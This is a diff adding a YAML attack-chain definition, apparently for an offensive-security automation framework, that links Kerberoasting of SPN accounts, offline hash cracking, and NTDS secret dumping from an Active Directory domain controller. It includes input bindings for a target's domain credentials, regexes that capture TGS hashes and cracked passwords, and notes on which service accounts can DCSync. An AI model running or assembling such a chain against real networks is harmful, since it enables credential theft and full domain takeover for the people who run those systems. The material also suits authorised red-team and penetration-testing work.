@@ -1,0 +1,64 @@
+id: kerberoast-chain
+name: "Kerberoast → Crack → Lateral Move"
+description: >
+  With one valid domain credential, request TGS tickets for every account
+  that has a ServicePrincipalName set, crack them offline, then reuse the
+  recovered service-account password to dump secrets from the DC.
+tags: [kerberos, kerberoast, credential-attack, lateral-movement, active-directory]
+difficulty: medium
+
+inputs:
+  - name: dc_ip
+    source: target_context.ip
+    required: true
+  - name: domain
+    source: target_context.domain
+    required: true
+  - name: user
+    source: target_context.user
+    required: true
+  - name: password
+    source: target_context.password
+    required: true
+
+steps:
+  - id: roast
+    name: "Request TGS tickets for SPN accounts"
+    command_ref: kerberoasting
+    inputs:
+      ip: "${dc_ip}"
+      domain: "${domain}"
+      user: "${user}"
+      password: "${password}"
+    capture:
+      - var: tgs_hashes
+        regex: '\$krb5tgs\$.+'
+        match: all
+      - var: kerberoastable_users
+        regex: '\$krb5tgs\$[0-9]+\*([A-Za-z0-9._$-]+)\$'
+        match: all
+
+  - id: crack
+    name: "Crack TGS hashes offline"
+    command_ref: Cracking-Kerberoasting-hashes
+    requires: [tgs_hashes]
+    capture:
+      - var: cracked_service_creds
+        regex: '^\$krb5tgs\$[^:]+:(.+)$'
+        match: all
+        transform: trim
+
+  - id: dump_secrets
+    name: "Dump NTDS via the service account"
+    notes: |
+      Many service accounts (especially SQL/IIS principals) are members of
+      privileged groups. If the cracked principal can DCSync, secretsdump
+      pulls every NTLM hash from the DC.
+    command_ref: secretsdump
+    requires: [cracked_service_creds]
+
+references:
+  - title: "Kerberoasting — The Hacker Recipes"
+    url:   "https://www.thehacker.recipes/ad/movement/kerberos/kerberoast"
+  - title: "Impacket secretsdump"
+    url:   "https://github.com/fortra/impacket/blob/master/examples/secretsdump.py"
